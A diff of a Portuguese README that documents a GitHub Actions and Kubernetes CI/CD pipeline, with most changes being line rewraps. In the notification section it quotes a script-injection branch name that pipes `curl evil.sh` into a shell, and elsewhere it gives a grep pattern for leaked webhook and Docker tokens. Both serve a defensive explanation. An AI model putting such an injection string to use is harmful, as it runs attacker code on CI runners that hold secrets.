-(`Test (Python 3.10)`). É o GitHub compondo os dois lados de um
-`workflow_call` — e é por isso que refatorar o pipeline renomeia os checks e
-invalida a lista do ruleset.
+(`Test (Python 3.10)`). É o GitHub compondo os dois lados de um `workflow_call`
+— e é por isso que refatorar o pipeline renomeia os checks e invalida a lista do
+ruleset.
 
 > [!WARNING]
 > `deploy-staging` **não** pode ser marcado como obrigatório: ele não roda em
@@ -1020,22 +1040,24 @@ diferentes e nos tiraria o controle sobre o que bloqueia.
 | `EC2_USER` | **Secrets** | Usuário utilizado para acesso à EC2 |
 | `EC2_SSH_KEY` | **Secrets** | Chave privada utilizada pelo CD para acesso à EC2 |
 
-Os valores sensíveis não são armazenados no repositório. O GitHub Actions os disponibiliza
-em tempo de execução por meio do contexto `secrets`. No caso do Kubernetes, as credenciais
-do Docker Hub também estão em um `docker-registry secret` no cluster. A imagem é pública,
-então o pull funcionaria sem ele; o secret cobre o caso de o repositório passar a privado,
-sem expor o token no manifesto.
+Os valores sensíveis não são armazenados no repositório. O GitHub Actions os
+disponibiliza em tempo de execução por meio do contexto `secrets`. No caso do
+Kubernetes, as credenciais do Docker Hub também estão em um `docker-registry
+secret` no cluster. A imagem é pública, então o pull funcionaria sem ele; o
+secret cobre o caso de o repositório passar a privado, sem expor o token no
+manifesto.
 
 Se `PYTHON_VERSIONS` não existir, o `ci.yml` usa o valor de reserva e testa as
-mesmas três versões — o pipeline não quebra, só deixa de ser configurável sem commit.
+mesmas três versões — o pipeline não quebra, só deixa de ser configurável sem
+commit.
 
 ### Environment
 
 `staging`, configurado com *required reviewers* e com a opção **Prevent
 self-review** marcada. O job `deploy-staging` declara esse environment e pausa
 até a aprovação. Secrets cadastrados dentro dele só ficam disponíveis para jobs
-que o declaram — é a diferença entre secret de repositório e secret com escopo de
-ambiente.
+que o declaram — é a diferença entre secret de repositório e secret com escopo
+de ambiente.
 
 | Opção | Valor |
 | --- | --- |
@@ -1057,11 +1079,11 @@ de um PR seja outra pessoa. Quem revisa faz o merge, e o autor aprova o deploy.
 /k8s/                   @weynne @jessicacamarco
 ```
 
-A última regra que corresponde ao caminho é a que vale. Cada área tem um mantenedor ao lado do dono
-do repositório, então a revisão cai em quem conhece aquela parte: pipeline com
-[@diegotavares16](https://github.com/diegotavares16), manifestos com
-[@jessicacamarco](https://github.com/jessicacamarco). O que não corresponde a nenhuma
-regra específica o time revisa entre si, pela regra `*`.
+A última regra que corresponde ao caminho é a que vale. Cada área tem um
+mantenedor ao lado do dono do repositório, então a revisão cai em quem conhece
+aquela parte: pipeline com [@diegotavares16](https://github.com/diegotavares16),
+manifestos com [@jessicacamarco](https://github.com/jessicacamarco). O que não
+corresponde a nenhuma regra específica o time revisa entre si, pela regra `*`.
 
 > [!NOTE]
 > Toda regra lista no mínimo **dois** donos de propósito. O autor de um PR não
@@ -1188,9 +1210,9 @@ pedir revisão quando um PR altera aquele caminho.
 | `/.github/workflows/` | Mudança no pipeline. Revisão do dono do repositório ou do mantenedor do CI |
 | `/k8s/` | Manifestos de deploy. Dono do repositório ou a mantenedora dos manifestos |
 
-**A última regra que corresponde é a que vale**, não a primeira. Um PR que altera
-o `ci.yml` cai na segunda regra e ignora a primeira. Quem lê o arquivo de cima
-para baixo costuma supor o contrário — é o erro de leitura mais comum.
+**A última regra que corresponde é a que vale**, não a primeira. Um PR que
+altera o `ci.yml` cai na segunda regra e ignora a primeira. Quem lê o arquivo de
+cima para baixo costuma supor o contrário — é o erro de leitura mais comum.
 
 **Toda regra tem no mínimo dois donos.** O autor de um PR não pode aprovar o
 próprio PR: numa regra de dono único, todo PR aberto por ele ficaria sem revisor
@@ -1240,8 +1262,8 @@ on:
 Cada um existe por um motivo diferente. **`pull_request`** é o que faz o CI ser
 um gate de merge — sem ele, o pipeline só rodaria depois do merge. **`push` na
 `main`** mantém o badge do README honesto sobre a saúde da branch principal.
-**`tags: ['*']`** submete toda tag aos mesmos gates, porque uma tag é candidata a
-release e nenhuma release deveria existir sem ter passado por lint, testes e
+**`tags: ['*']`** submete toda tag aos mesmos gates, porque uma tag é candidata
+a release e nenhuma release deveria existir sem ter passado por lint, testes e
 scans.
 
 #### `permissions:` — menor privilégio
@@ -1257,8 +1279,8 @@ maliciosa, por exemplo — poderia escrever no repositório, criar releases ou
 apagar branches.
 
 O bloco no topo é o **padrão** de todos os jobs. Um job que precisa de mais pede
-explicitamente, e só ele recebe: o `test` declara `security-events: write` porque
-o reusable sobe SARIF.
+explicitamente, e só ele recebe: o `test` declara `security-events: write`
+porque o reusable sobe SARIF.
 
 #### `concurrency:` — um run por branch
 
@@ -1269,8 +1291,8 @@ concurrency:
 ```
 
 O `group` é a chave: runs com a mesma chave não coexistem. Como a chave inclui a
-ref, dois PRs diferentes rodam em paralelo, mas dois pushes na mesma branch não —
-o novo cancela o antigo em vez de entrar na fila atrás dele.
+ref, dois PRs diferentes rodam em paralelo, mas dois pushes na mesma branch não
+— o novo cancela o antigo em vez de entrar na fila atrás dele.
 
 #### `env:` — o que não deve ficar fixo no código
 
@@ -1279,8 +1301,8 @@ env:
   DEFAULT_PYTHON_VERSION: '3.12'
 ```
 
-Usado pelo job `lint`, que não precisa da matrix inteira: `ruff` analisa o código
-estaticamente, sem executá-lo, então rodar nas três versões daria o mesmo
+Usado pelo job `lint`, que não precisa da matrix inteira: `ruff` analisa o
+código estaticamente, sem executá-lo, então rodar nas três versões daria o mesmo
 resultado três vezes. Sem a variável, a versão ficaria escrita direto no step, e
 trocar de 3.12 para 3.13 exigiria caçar ocorrências pelo arquivo.
 
@@ -1315,8 +1337,8 @@ Cinco decisões em dez linhas:
 executa steps é o reusable. É o erro mais comum: acrescentar `runs-on` aqui
 quebra o workflow com erro de validação.
 
-**A matrix vive no chamador.** O `strategy.matrix` multiplica este job em três, e
-cada cópia chama o reusable uma vez. Trocar as versões testadas não toca nos
+**A matrix vive no chamador.** O `strategy.matrix` multiplica este job em três,
+e cada cópia chama o reusable uma vez. Trocar as versões testadas não toca nos
 steps, e mudar os steps não toca nas versões.
 
 **`fail-fast: false`.** O padrão do GitHub é `true`, que **cancela** as outras
@@ -1326,8 +1348,8 @@ ciclos de corrigir e rodar de novo.
 
 **As versões vêm de uma variável.** `vars.PYTHON_VERSIONS` é configuração, não
 código: ampliar a cobertura é uma edição em `Settings`, sem commit. O literal
-depois do `||` é o valor de reserva — sem ele, um clone sem a variável cadastrada
-quebraria no `fromJSON` de uma string vazia.
+depois do `||` é o valor de reserva — sem ele, um clone sem a variável
+cadastrada quebraria no `fromJSON` de uma string vazia.
 
 **`with:` é o contrato.** O valor da matrix entra no reusable pelo input
 `python-version`. É por isso que o mesmo dado tem dois nomes: `matrix.` aqui,
@@ -1345,9 +1367,9 @@ quebraria no `fromJSON` de uma string vazia.
       DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
 ```
 
-**`needs: [lint, test]`** é a garantia principal: se qualquer gate reprova, o job
-é pulado, e uma imagem com dependência vulnerável ou teste quebrado nunca chega ao
-Docker Hub.
+**`needs: [lint, test]`** é a garantia principal: se qualquer gate reprova, o
+job é pulado, e uma imagem com dependência vulnerável ou teste quebrado nunca
+chega ao Docker Hub.
 
 O primeiro step calcula as tags, seguindo a tabela do `docs/ci-pipeline.md`:
 
@@ -1358,9 +1380,9 @@ O primeiro step calcula as tags, seguindo a tabela do `docs/ci-pipeline.md`:
 | Push de tag | a própria tag | `v1.2.0` |
 
 Toda imagem recebe também o **hash curto do commit**, o que permite rastrear um
-pod até o commit exato. Em pull request, esse hash vem do head da branch, e não do
-merge temporário que o GitHub monta. Caracteres que o Docker não aceita em tag,
-como `/`, viram `-`.
+pod até o commit exato. Em pull request, esse hash vem do head da branch, e não
+do merge temporário que o GitHub monta. Caracteres que o Docker não aceita em
+tag, como `/`, viram `-`.
 
 ```yaml
       - name: Build and push
@@ -1414,7 +1436,8 @@ os revisores rapidamente.
 
 > [!WARNING]
 > Este job **não** pode ser marcado como required status check. Ele não roda em
-> pull request, e um check que nunca reporta deixa o merge bloqueado para sempre.
+> pull request, e um check que nunca reporta deixa o merge bloqueado para
+> sempre.
 
 #### `jobs.notify` — dois steps e os cuidados de cada um
 
@@ -1436,9 +1459,9 @@ expõe o caminho de um arquivo nessa variável, e o step anexa linhas
 `nome=valor`. O **`id: msg`** é o que torna esses valores endereçáveis como
 `steps.msg.outputs.status` daqui para frente.
 
-**`skipped` conta como neutro.** `deploy-staging` fica `skipped` em pull request,
-porque a condição `if:` dele não é satisfeita. Tratar isso como falha faria todo PR reportar um
-pipeline vermelho.
+**`skipped` conta como neutro.** `deploy-staging` fica `skipped` em pull
+request, porque a condição `if:` dele não é satisfeita. Tratar isso como falha
+faria todo PR reportar um pipeline vermelho.
 
 ```yaml
       - name: Send Discord notification
@@ -1451,8 +1474,8 @@ pipeline vermelho.
           | curl -sS --fail-with-body -d @- "$WEBHOOK_URL"
 ```
 
-**Todo valor entra por `env:`, e o shell lê como `$VAR`.** Escrever
-`${{ github.head_ref }}` direto dentro do `run:` colaria o valor no **texto do
+**Todo valor entra por `env:`, e o shell lê como `$VAR`.** Escrever `${{
+github.head_ref }}` direto dentro do `run:` colaria o valor no **texto do
 script** antes de o shell executá-lo — uma branch chamada `x";curl evil.sh|sh;"`
 viraria código executável. É a injeção de script clássica do Actions. Por `env:`
 o valor é apenas dado.
@@ -1468,12 +1491,13 @@ o Discord recusa o payload: o job fica verde e a mensagem nunca chega. Com ele o
 step fica vermelho e o log mostra o motivo que o Discord devolveu.
 
 **`jq` monta o JSON**, em vez de concatenação de string: uma aspa ou um acento
-num nome de branch não geram um JSON malformado. O `jq` vem
-pré-instalado nos runners Ubuntu do GitHub.
+num nome de branch não geram um JSON malformado. O `jq` vem pré-instalado nos
+runners Ubuntu do GitHub.
 
-**A condição fica no step, não no job.** O contexto `secrets` não está disponível em
-`if:` de job — daí o `if: env.WEBHOOK_URL != ''` aqui. Sem ele, um clone deste
-repositório sem webhook configurado falharia num `curl` para uma URL vazia.
+**A condição fica no step, não no job.** O contexto `secrets` não está
+disponível em `if:` de job — daí o `if: env.WEBHOOK_URL != ''` aqui. Sem ele, um
+clone deste repositório sem webhook configurado falharia num `curl` para uma URL
+vazia.
 
 **`if: always()` no job** é obrigatório: um job que depende do sucesso dos
 anteriores nunca dispararia numa falha, que é exatamente quando a notificação
@@ -1526,9 +1550,9 @@ multiplica é o `ci.yml`.
 ```
 
 Três componentes na chave, cada um evitando um problema: **sistema do runner**
-porque um pacote *wheel* compilado para Linux não serve no macOS; **versão do Python** porque
-`cp310` e `cp312` são incompatíveis; **hash dos requirements** porque mudar
-dependência tem que invalidar o cache.
+porque um pacote *wheel* compilado para Linux não serve no macOS; **versão do
+Python** porque `cp310` e `cp312` são incompatíveis; **hash dos requirements**
+porque mudar dependência tem que invalidar o cache.
 
 Chave igual à de um run anterior significa *cache hit* e nada é baixado. Chave
 diferente significa *miss*, mas o `restore-keys` casa por prefixo e recupera um
@@ -1568,8 +1592,8 @@ minutos de máquina, e sim dar retorno rápido no PR.
           category: trivy-python-${{ inputs.python-version }}
 ```
 
-Dois detalhes que não são preferência. **`if: always()`**: o step anterior sai com
-código 1 quando acha vulnerabilidade, e sem o `always()` este seria pulado —
+Dois detalhes que não são preferência. **`if: always()`**: o step anterior sai
+com código 1 quando acha vulnerabilidade, e sem o `always()` este seria pulado —
 o relatório nunca chegaria ao code scanning exatamente quando há o que reportar.
 **`category` por versão**: são três uploads do mesmo commit, um por job da
 matrix; sem categoria distinta eles se sobrescrevem, e uploads simultâneos podem
@@ -1602,18 +1626,17 @@ explícito da rubrica.
 
 ### `requirements.txt`
 
-Único arquivo de código que o grupo toca, e apenas na
-[demonstração de shift-left](#2-reproduzir-a-demonstração-de-shift-left): a linha
-do `requests` é rebaixada para 2.31.0 para ver o gate reprovar, e devolvida
-para 2.33.0 na mesma branch. A aplicação em `app.py` não foi alterada em momento
-nenhum.
+Único arquivo de código que o grupo toca, e apenas na [demonstração de
+shift-left](#2-reproduzir-a-demonstração-de-shift-left): a linha do `requests` é
+rebaixada para 2.31.0 para ver o gate reprovar, e devolvida para 2.33.0 na mesma
+branch. A aplicação em `app.py` não foi alterada em momento nenhum.
 
 ---
 
 ## Variáveis, inputs e secrets
 
-Nenhum valor fica fixo e espalhado pelo YAML. Cada tipo de dado entra por um mecanismo
-diferente, escolhido pelo escopo e pela sensibilidade.
+Nenhum valor fica fixo e espalhado pelo YAML. Cada tipo de dado entra por um
+mecanismo diferente, escolhido pelo escopo e pela sensibilidade.
 
 | Mecanismo | Onde é declarado | Usado para | Exemplo aqui |
 | --- | --- | --- | --- |
@@ -1638,11 +1661,11 @@ matrix:
   python-version: ${{ fromJSON(vars.PYTHON_VERSIONS || '["3.10", "3.11", "3.12"]') }}
 ```
 
-Assim ampliar ou reduzir a cobertura é uma edição em `Settings`, sem commit e sem
-novo PR. O literal depois do `||` é um **valor de reserva**: sem ele, um clone deste
-repositório sem a variável cadastrada quebraria no `fromJSON` de uma string
-vazia. Variável, e não secret, porque a informação não é sensível — o valor
-aparece no log do run de qualquer forma.
+Assim ampliar ou reduzir a cobertura é uma edição em `Settings`, sem commit e
+sem novo PR. O literal depois do `||` é um **valor de reserva**: sem ele, um
+clone deste repositório sem a variável cadastrada quebraria no `fromJSON` de uma
+string vazia. Variável, e não secret, porque a informação não é sensível — o
+valor aparece no log do run de qualquer forma.
 
 O `python-version` aparece com dois nomes diferentes de propósito: é
 `matrix.python-version` no `ci.yml` e `inputs.python-version` no reusable. O
@@ -1657,9 +1680,9 @@ Quem multiplica é o chamador.
 
 ### Inputs do CD
 
-Os workflows de deployment recebem a tag da imagem como input manual. Isso permite
-escolher exatamente qual versão publicada no Docker Hub será implantada, sem reconstruir
-a imagem durante o CD.
+Os workflows de deployment recebem a tag da imagem como input manual. Isso
+permite escolher exatamente qual versão publicada no Docker Hub será implantada,
+sem reconstruir a imagem durante o CD.
 
 | Workflow | Input | Função |
 | --- | --- | --- |
@@ -1687,10 +1710,14 @@ git log -p --all | grep -nE 'discord\.com/api/webhooks|hooks\.slack\.com|dckr_pa
 Na interface do GitHub:
 
 - **Actions** — o run do último push na `main` com os quatro checks verdes
-- **Em um PR com dependência vulnerável** — alertas do Trivy anotados na linha alterada e botão de merge cinza
-- **Após um merge na `main`** — `Deploy to staging (dummy)` em *Waiting*, com **Review deployments**
-- **Discord** — card verde a cada run bem-sucedido e vermelho quando um gate reprova, com link para o run
-- **Docker Hub** — a imagem `app-k8s-todolist` com `latest` e o hash curto do commit após um merge na `main`, e `PR-<número>` a cada pull request
+- **Em um PR com dependência vulnerável** — alertas do Trivy anotados na linha
+  alterada e botão de merge cinza
+- **Após um merge na `main`** — `Deploy to staging (dummy)` em *Waiting*, com
+  **Review deployments**
+- **Discord** — card verde a cada run bem-sucedido e vermelho quando um gate
+  reprova, com link para o run
+- **Docker Hub** — a imagem `app-k8s-todolist` com `latest` e o hash curto do
+  commit após um merge na `main`, e `PR-<número>` a cada pull request
 
 ---
 
@@ -1702,15 +1729,16 @@ rodarem pelo menos uma vez: abra um PR, deixe o CI rodar e volte para marcá-los
 
 **O merge está bloqueado por um check que não existe mais.** Os nomes dos checks
 mudam quando o pipeline é refatorado — introduzir a matrix ou extrair o reusable
-renomeia todos eles. Rode o CI uma vez para os novos nomes aparecerem e marque-os de novo.
+renomeia todos eles. Rode o CI uma vez para os novos nomes aparecerem e
+marque-os de novo.
 
 **`CODEOWNERS` com aviso "Unknown owner".** O usuário listado não tem acesso de
-escrita ao repositório, ou o convite de colaborador ainda não foi aceito. A regra
-é ignorada silenciosamente até isso ser resolvido.
+escrita ao repositório, ou o convite de colaborador ainda não foi aceito. A
+regra é ignorada silenciosamente até isso ser resolvido.
 
 **Um PR não consegue ser aprovado por ninguém.** O autor não pode aprovar o
-próprio PR. Se ele for o único code owner do caminho tocado, a mudança precisa ser
-proposta por outra pessoa.
+próprio PR. Se ele for o único code owner do caminho tocado, a mudança precisa
+ser proposta por outra pessoa.
 
 **Um commit na `main` saiu com a mensagem fora do padrão.** O ruleset só permite
 *squash*, e no squash o GitHub usa o **título do PR** como mensagem do commit —
@@ -1719,8 +1747,9 @@ Corrigir depois exigiria force push, que o ruleset bloqueia; o que evita o
 problema é revisar o título ao abrir o PR.
 
 **O job `notify` fica verde mas nada chega no canal.** O secret
-`NOTIFY_WEBHOOK_URL` não está cadastrado, e a condição `if: env.WEBHOOK_URL != ''`
-pula o envio de propósito. Confira em `Settings → Secrets and variables → Actions`.
+`NOTIFY_WEBHOOK_URL` não está cadastrado, e a condição `if: env.WEBHOOK_URL !=
+''` pula o envio de propósito. Confira em `Settings → Secrets and variables →
+Actions`.
 
 **`Log in to Docker Hub` falha com `unauthorized`.** O `DOCKERHUB_TOKEN` foi
 revogado, expirou ou não tem permissão de escrita. Gere outro em Docker Hub →
@@ -1730,60 +1759,64 @@ revogado, expirou ou não tem permissão de escrita. Gere outro em Docker Hub �
 secret `DOCKERHUB_USERNAME` não está cadastrado: sem ele a imagem é só
 construída, de propósito.
 
-**`upload-sarif` retorna 403.** Code scanning em repositório privado exige GitHub
-Advanced Security. Ver [Divergências](#divergências-em-relação-ao-enunciado).
+**`upload-sarif` retorna 403.** Code scanning em repositório privado exige
+GitHub Advanced Security. Ver
+[Divergências](#divergências-em-relação-ao-enunciado).
 
-**`Cache save failed` em um dos jobs da matrix.** É um aviso, não um erro. Os três
-jobs terminam quase juntos e o GitHub recusa gravações concorrentes de cache. A
-execução seguinte restaura pelo `restore-keys` e o build não é afetado.
+**`Cache save failed` em um dos jobs da matrix.** É um aviso, não um erro. Os
+três jobs terminam quase juntos e o GitHub recusa gravações concorrentes de
+cache. A execução seguinte restaura pelo `restore-keys` e o build não é afetado.
 
-**O workflow não dispara.** Arquivos `.yml.example` são inertes: o GitHub Actions
-só executa `.yml` e `.yaml` dentro de `.github/workflows/`.
+**O workflow não dispara.** Arquivos `.yml.example` são inertes: o GitHub
+Actions só executa `.yml` e `.yaml` dentro de `.github/workflows/`.
 
-**O Pod fica em `ErrImagePull` ou `ImagePullBackOff`.** O cluster não conseguiu baixar a
-imagem: tag inexistente, ou repositório privado sem credencial válida. Confira se o secret `dockerhub-secret` existe no
-namespace correto e se o manifesto referencia esse secret em `imagePullSecrets`:
+**O Pod fica em `ErrImagePull` ou `ImagePullBackOff`.** O cluster não conseguiu
+baixar a imagem: tag inexistente, ou repositório privado sem credencial válida.
+Confira se o secret `dockerhub-secret` existe no namespace correto e se o
+manifesto referencia esse secret em `imagePullSecrets`:
 
 ```bash
 kubectl get secret dockerhub-secret -n todolist
 ```
 
-Se o secret não existir, recrie-o com as credenciais do Docker Hub. Também confira se a
-imagem e a tag informadas no Deployment existem no registry.
+Se o secret não existir, recrie-o com as credenciais do Docker Hub. Também
+confira se a imagem e a tag informadas no Deployment existem no registry.
 
 **O Ingress responde `404` ou a aplicação não abre pelo hostname.** Confira se o
-Ingress Controller está instalado, se o recurso `Ingress` existe e se o hostname usado
-na requisição corresponde ao configurado no manifesto. Em ambiente local, o hostname
-também precisa apontar para o IP da EC2 no arquivo `/etc/hosts`.
+Ingress Controller está instalado, se o recurso `Ingress` existe e se o hostname
+usado na requisição corresponde ao configurado no manifesto. Em ambiente local,
+o hostname também precisa apontar para o IP da EC2 no arquivo `/etc/hosts`.
 
-**O Rolling Update não termina.** Confira o estado do Deployment e dos Pods antes de
-tentar um novo deploy:
+**O Rolling Update não termina.** Confira o estado do Deployment e dos Pods
+antes de tentar um novo deploy:
 
 ```bash
 kubectl rollout status deployment/todolist -n todolist
 kubectl get pods -n todolist
 ```
 
-Se houver falha de readiness ou o novo Pod não ficar `Ready`, o rollout não deve ser
-considerado concluído. Corrija a causa e acompanhe novamente o `rollout status`.
+Se houver falha de readiness ou o novo Pod não ficar `Ready`, o rollout não deve
+ser considerado concluído. Corrija a causa e acompanhe novamente o `rollout
+status`.
 
-**O Blue/Green foi implantado, mas a produção continua apontando para a versão anterior.**
-No fluxo Blue/Green, o deployment e a troca de tráfego são operações separadas. Depois
-de validar o ambiente escolhido, execute o workflow `cd-blue-green-switch.yml` para
-alterar o selector do Service de produção.
+**O Blue/Green foi implantado, mas a produção continua apontando para a versão
+anterior.** No fluxo Blue/Green, o deployment e a troca de tráfego são operações
+separadas. Depois de validar o ambiente escolhido, execute o workflow
+`cd-blue-green-switch.yml` para alterar o selector do Service de produção.
 
-**É necessário fazer rollback no Blue/Green.** Não é necessário reconstruir a imagem.
-O ambiente anterior permanece disponível; basta executar novamente o workflow de troca
-de tráfego indicando a cor anterior e validar o endpoint `/healthz`:
+**É necessário fazer rollback no Blue/Green.** Não é necessário reconstruir a
+imagem. O ambiente anterior permanece disponível; basta executar novamente o
+workflow de troca de tráfego indicando a cor anterior e validar o endpoint
+`/healthz`:
 
 ```bash
 gh workflow run cd-blue-green-switch.yml -f color=blue
 curl -i -H "Host: todolist.local" http://localhost/healthz
 ```
 
-**A EC2 mudou de endereço depois de ser reiniciada.** O IP público da instância pode
-mudar após stop/start. Nesse caso, atualize o secret `EC2_HOST` no GitHub e também a
-entrada correspondente no `/etc/hosts` usada para acessar o Ingress.
+**A EC2 mudou de endereço depois de ser reiniciada.** O IP público da instância
+pode mudar após stop/start. Nesse caso, atualize o secret `EC2_HOST` no GitHub e
+também a entrada correspondente no `/etc/hosts` usada para acessar o Ingress.
 
 ---
 
@@ -1813,10 +1846,10 @@ Actions estão fixadas por SHA de commit no YAML, com a tag em comentário.
 | Notificação | webhook do Discord via `curl` | — | job `notify` |
 | Aprovação humana | environment do GitHub com *required reviewer* | — | job `deploy-staging` |
 
-Três mecanismos do GitHub Actions sustentam o desenho: **reusable
-workflow** (`workflow_call`) para não duplicar steps, **matrix** para multiplicar
-o job por versão do Python, e **environment** para introduzir aprovação humana
-sem escrever lógica nenhuma.
+Três mecanismos do GitHub Actions sustentam o desenho: **reusable workflow**
+(`workflow_call`) para não duplicar steps, **matrix** para multiplicar o job por
+versão do Python, e **environment** para introduzir aprovação humana sem
+escrever lógica nenhuma.
 
 | Papel no CD | Ferramenta/estratégia | Uso |
 | --- | --- | --- |
@@ -1829,41 +1862,42 @@ sem escrever lógica nenhuma.
 | Validação | `kubectl rollout status` + `/healthz` | Confirma rollout e disponibilidade da aplicação |
 | Rollback | `kubectl rollout undo` / troca de cor | Retorna para uma versão ou ambiente anterior |
 
-O desenho do CD separa **deploy** de **ativação do tráfego** no Blue/Green. A nova
-versão pode ser implantada e validada antes de receber requisições de produção.
+O desenho do CD separa **deploy** de **ativação do tráfego** no Blue/Green. A
+nova versão pode ser implantada e validada antes de receber requisições de
+produção.
 
 ### Por que assim
 
 **Um reusable workflow, não steps duplicados.** A matrix e a lógica de teste têm
 razões de mudança diferentes. Extrair os steps para `_reusable-test.yml` faz com
-que trocar as versões testadas não toque nos steps, e mudar os steps não toque nas
-versões. O efeito colateral é que os checks passam a se chamar
-`test (3.10) / Test (Python 3.10)` — o GitHub compõe o nome do job chamador, com
-o valor da matrix, e o nome do job dentro do reusable.
+que trocar as versões testadas não toque nos steps, e mudar os steps não toque
+nas versões. O efeito colateral é que os checks passam a se chamar `test (3.10)
+/ Test (Python 3.10)` — o GitHub compõe o nome do job chamador, com o valor da
+matrix, e o nome do job dentro do reusable.
 
-**Actions fixadas por SHA de commit, não por tag.** Tags são mutáveis: `@v4` hoje
-pode apontar para outro commit amanhã, dando a quem comprometer a conta do
+**Actions fixadas por SHA de commit, não por tag.** Tags são mutáveis: `@v4`
+hoje pode apontar para outro commit amanhã, dando a quem comprometer a conta do
 mantenedor execução de código no pipeline, com acesso aos secrets. Cada `uses:`
 aponta para o commit imutável do release, com a tag em comentário para manter a
 linha legível.
 
 **Fixar a versão não é congelá-la.** As versões dos esqueletos do starter-kit
-(`checkout@v4.2.2`, `setup-python@v5.6.0`, `cache@v4.2.4`) rodam em **Node.js 20**,
-que o GitHub descontinuou — cada execução reportava oito avisos dizendo que as actions
-estavam sendo forçadas para o Node.js 24, e o `upload-sarif` avisava que a CodeQL
-Action v3 sai em dezembro de 2026. Subimos as quatro para o release atual, cada
-uma no seu SHA. É a outra metade da prática: fixar o hash protege contra a tag
-mudar debaixo dos pés, acompanhar o release protege contra rodar num runtime que
-o fornecedor já abandonou.
+(`checkout@v4.2.2`, `setup-python@v5.6.0`, `cache@v4.2.4`) rodam em **Node.js
+20**, que o GitHub descontinuou — cada execução reportava oito avisos dizendo
+que as actions estavam sendo forçadas para o Node.js 24, e o `upload-sarif`
+avisava que a CodeQL Action v3 sai em dezembro de 2026. Subimos as quatro para o
+release atual, cada uma no seu SHA. É a outra metade da prática: fixar o hash
+protege contra a tag mudar debaixo dos pés, acompanhar o release protege contra
+rodar num runtime que o fornecedor já abandonou.
 
 **Atenção à tag anotada do `trivy-action`.** Diferente das `actions/*`, a tag
-`v0.36.0` do `aquasecurity/trivy-action` é **anotada**: o SHA que o `git ls-remote`
-lista primeiro é o do objeto-tag, não o do commit. Fixar o objeto-tag faz o
-workflow falhar. O valor correto é o commit (`ed142fd…`).
+`v0.36.0` do `aquasecurity/trivy-action` é **anotada**: o SHA que o `git
+ls-remote` lista primeiro é o do objeto-tag, não o do commit. Fixar o objeto-tag
+faz o workflow falhar. O valor correto é o commit (`ed142fd…`).
 
-**`permissions` mínimo no workflow, elevado por job.** O topo declara
-`contents: read`. Só o job `test` recebe `security-events: write`, porque só ele
-sobe SARIF. Um workflow comprometido faz menos estrago se o token só pode ler.
+**`permissions` mínimo no workflow, elevado por job.** O topo declara `contents:
+read`. Só o job `test` recebe `security-events: write`, porque só ele sobe
+SARIF. Um workflow comprometido faz menos estrago se o token só pode ler.
 
 **`pip-audit` restrito a `requirements.txt`.** Auditar o ambiente inteiro
 misturaria dependências de desenvolvimento no gate de produção. Um CVE no `ruff`
@@ -1875,33 +1909,34 @@ edição em `Settings`, sem commit e sem PR. O fallback no `||` mantém o pipeli
 executável em qualquer clone.
 
 **Tag também passa pelos gates.** `tags: ['*']` no gatilho de push garante que
-nenhuma tag chegue a virar release sem ter passado por lint, testes e scans — e a
-imagem da tag só é publicada depois disso.
+nenhuma tag chegue a virar release sem ter passado por lint, testes e scans — e
+a imagem da tag só é publicada depois disso.
 
 **Lint fora da matrix.** Rodar o linter nas três versões do Python daria o mesmo
 resultado três vezes: o `ruff` analisa o código estaticamente, sem executá-lo. O
 job `lint` roda uma vez na versão padrão, em paralelo com os testes.
 
-**Notificação protegida contra secret ausente.** O step de envio só roda se o webhook
-estiver configurado. Isso mantém o pipeline verde em um fork ou clone do
+**Notificação protegida contra secret ausente.** O step de envio só roda se o
+webhook estiver configurado. Isso mantém o pipeline verde em um fork ou clone do
 repositório, em vez de falhar num `curl` para uma URL vazia.
 
-**`deploy-staging` fora dos required checks.** Um job que não roda em pull request
-jamais reporta status. Torná-lo obrigatório bloquearia todo merge indefinidamente.
+**`deploy-staging` fora dos required checks.** Um job que não roda em pull
+request jamais reporta status. Torná-lo obrigatório bloquearia todo merge
+indefinidamente.
 
 **Quem faz o merge não aprova o deploy.** O environment começou sem *Prevent
 self-review*, e o primeiro deploy na `main` acabou aprovado por quem tinha
 disparado o run. Funcionava, mas esvaziava o gate: um passo de aprovação que a
-mesma pessoa cumpre sozinha evita acidentes, mas não garante uma segunda avaliação. Ligamos a
-opção depois de perceber isso, e o histórico de deployments registra os dois
-momentos.
+mesma pessoa cumpre sozinha evita acidentes, mas não garante uma segunda
+avaliação. Ligamos a opção depois de perceber isso, e o histórico de deployments
+registra os dois momentos.
 
-O custo que temíamos não se confirmou. A opção bloqueia **quem disparou o run** —
-e quem dispara é quem clica em *Merge* —, não o autor do pull request. Como o
-`CODEOWNERS` já obriga que o revisor seja outra pessoa, os dois papéis se separam
-sozinhos: o revisor faz o merge, o autor aprova o deploy. É a segregação de funções
-que auditoria de verdade exige, obtida com um checkbox e nenhuma coordenação
-extra.
+O custo que temíamos não se confirmou. A opção bloqueia **quem disparou o run**
+— e quem dispara é quem clica em *Merge* —, não o autor do pull request. Como o
+`CODEOWNERS` já obriga que o revisor seja outra pessoa, os dois papéis se
+separam sozinhos: o revisor faz o merge, o autor aprova o deploy. É a segregação
+de funções que auditoria de verdade exige, obtida com um checkbox e nenhuma
+coordenação extra.
 
 **A imagem só é publicada depois dos gates.** O job `push` depende de `lint` e
 `test`: se qualquer gate reprova, ele é pulado, e uma imagem com dependência
@@ -1918,25 +1953,27 @@ vindo de fork, ou num clone deste repositório, os secrets do Docker Hub não
 existem. Em vez de falhar no login, o job constrói a imagem — o que ainda valida
 o `Dockerfile` — e pula o login e a publicação.
 
-**Rolling Update como estratégia padrão.** O Kubernetes atualiza o Deployment de forma
-gradual e o pipeline aguarda o `rollout status` antes de executar o smoke test. Isso
-evita considerar o deployment concluído apenas porque o manifesto foi aplicado.
+**Rolling Update como estratégia padrão.** O Kubernetes atualiza o Deployment de
+forma gradual e o pipeline aguarda o `rollout status` antes de executar o smoke
+test. Isso evita considerar o deployment concluído apenas porque o manifesto foi
+aplicado.
 
-**Blue/Green com deploy e troca de tráfego separados.** Os ambientes `blue` e `green`
-são deployments independentes. O workflow de deploy prepara uma cor e valida sua
-saúde; outro workflow altera o selector do Service de produção. A separação reduz o
-risco de colocar uma versão ainda não validada no tráfego de produção.
+**Blue/Green com deploy e troca de tráfego separados.** Os ambientes `blue` e
+`green` são deployments independentes. O workflow de deploy prepara uma cor e
+valida sua saúde; outro workflow altera o selector do Service de produção. A
+separação reduz o risco de colocar uma versão ainda não validada no tráfego de
+produção.
 
-**ClusterIP + Ingress.** Os Services permanecem internos ao cluster e o NGINX Ingress
-é o ponto de entrada HTTP. No Blue/Green, o Service de produção continua sendo o
